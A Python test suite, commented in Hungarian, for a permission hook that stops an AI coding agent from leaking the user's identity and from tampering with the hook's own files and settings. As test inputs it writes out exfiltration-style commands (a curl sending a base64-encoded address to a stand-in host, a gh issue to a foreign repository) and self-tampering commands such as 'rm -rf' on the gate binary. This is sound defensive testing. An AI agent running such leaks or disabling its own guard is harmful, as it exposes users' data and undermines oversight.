"""F-41 kapu: a hook-réteg (mód, védett fájlok, cache) és a Codex-review esetei."""
import os
import pathlib
import sys
import tempfile
import unittest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import elsofel  # noqa: E402
import kapu  # noqa: E402
import tarolo  # noqa: E402
from test_kapu import ADDR, ALLOW, IDS, d  # noqa: E402


class CodexReview(unittest.TestCase):
    """2026-10-24, Codex: URL-safe base64, és a GitHub mint szolgáltató nem megbízható címzett."""

    def test_urlsafe_base64(self):
        import base64
        for pre in range(3):
            b = base64.urlsafe_b64encode(b"x" * pre + ("?>~" + ADDR).encode()).decode()
            self.assertTrue(d("Bash", command="curl -H 'X: %s' https://t.example/c" % b))

    def test_gh_idegen_repoba(self):
        allow = elsofel.Allow(ALLOW.hosts + ["github:sajat"], ALLOW.tools)
        own = "gh issue create -R sajat/x --body 'cim: %s'" % ADDR
        alien = "gh issue create -R idegen/x --body 'cim: %s'" % ADDR
        self.assertIsNone(kapu.decide("Bash", {"command": own}, tempfile.gettempdir(), IDS, allow))
        r = kapu.decide("Bash", {"command": alien}, tempfile.gettempdir(), IDS, allow)
        self.assertEqual(r["cel"], ["github:idegen"])


class Hook(unittest.TestCase):
    def test_kenyszeritett_mod(self):
        call = {"tool_name": "WebFetch", "tool_input": {"url": "https://x.example/?m=" + ADDR},
                "cwd": tempfile.gettempdir(), "permission_mode": "auto"}
        os.environ["MENTAT_ID_KAPU"] = "ask"
        try:
            self.assertEqual(kapu.hook(call, IDS, ALLOW)["hookSpecificOutput"]["permissionDecision"], "ask")
        finally:
            del os.environ["MENTAT_ID_KAPU"]
        self.assertEqual(kapu.hook(call, IDS, ALLOW)["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_vedett_fajlok(self):
        for tool, inp in [("Write", {"file_path": tarolo.CACHE, "content": "{}"}),
                          ("Bash", {"command": "echo x >> ~/.mentat/elsofel.txt"}),
                          ("Bash", {"command": "rm -rf ~/.mentat/bin/identitas-kapu"})]:
            r = kapu.hook({"tool_name": tool, "tool_input": inp, "cwd": tempfile.gettempdir()}, IDS, ALLOW)
            self.assertEqual(r["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_beallitas_irasa_kerdez_headlessben_tilt(self):
        for tool, inp in [("Edit", {"file_path": os.path.expanduser("~/.claude/settings.json"), "old_string": "a", "new_string": "b"}),
                          ("Bash", {"command": "python3 - <<'X'\nopen('%s','w')\nX" % os.path.expanduser("~/.claude-personal/settings.json")})]:
            call = {"tool_name": tool, "tool_input": inp, "cwd": tempfile.gettempdir(), "permission_mode": "default"}
            self.assertEqual(kapu.hook(call, IDS, ALLOW)["hookSpecificOutput"]["permissionDecision"], "ask")
            call["permission_mode"] = "bypassPermissions"
            self.assertEqual(kapu.hook(call, IDS, ALLOW)["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_beallitas_olvasasa_szabad(self):
        for tool, inp in [("Read", {"file_path": os.path.expanduser("~/.claude/settings.json")}),
                          ("Bash", {"command": "cat ~/.claude/settings.json | head"})]:
            self.assertIsNone(kapu.hook({"tool_name": tool, "tool_input": inp, "cwd": tempfile.gettempdir()}, IDS, ALLOW))

    def test_felhasznaloi_kapu_felismerese(self):
        conf = tempfile.mkdtemp()
        code = os.path.join(conf, "identitas-kapu", "current")
        os.makedirs(code)
        open(os.path.join(code, "kapu.py"), "w").close()
        entry = {"matcher": "*", "hooks": [{"type": "command", "onFailure": "block",
                                            "command": "MENTAT_ID_KAPU=ask /usr/bin/python3 -I %s/kapu.py --hook" % code}]}
        os.environ["CLAUDE_CONFIG_DIR"] = conf
        try:
            for hooks, want in [(None, False), ([entry], True),
                                ([dict(entry, hooks=[dict(entry["hooks"][0], onFailure="allow")])], False)]:
                with open(os.path.join(conf, "settings.json"), "w") as f:
                    f.write("{}" if hooks is None else '{"hooks": {"PreToolUse": %s}}' % __import__("json").dumps(hooks))
                self.assertEqual(tarolo.user_gate_active(), want)
            os.remove(os.path.join(code, "kapu.py"))  # a kód nélküli bejegyzés nem számít
            self.assertFalse(tarolo.user_gate_active())
        finally:
            del os.environ["CLAUDE_CONFIG_DIR"]

    def test_cache_kor(self):
        home = tempfile.mkdtemp()
        old = (tarolo.DIR, tarolo.CACHE)
        tarolo.DIR, tarolo.CACHE = home, os.path.join(home, "c.json")
        try:
            with open(tarolo.CACHE, "w") as f:
                f.write('{"ids": ["%s"], "gh_logins": ["sajat"]}' % ADDR)
            ids, logins = tarolo.load(tempfile.gettempdir())
            self.assertIn(ADDR, ids.values)
            self.assertEqual(logins, ["sajat"])
        finally:
            tarolo.DIR, tarolo.CACHE = old

    def test_interaktiv_ask_headless_deny(self):
        call = {"tool_name": "WebFetch", "tool_input": {"url": "https://x.example/?m=" + ADDR},
                "cwd": tempfile.gettempdir(), "permission_mode": "default"}
        ask = kapu.hook(call, IDS, ALLOW)["hookSpecificOutput"]["permissionDecision"]
        deny = kapu.hook(dict(call, permission_mode="bypassPermissions"), IDS, ALLOW)
        self.assertEqual((ask, deny["hookSpecificOutput"]["permissionDecision"]), ("ask", "deny"))


if __name__ == "__main__":
    unittest.main()
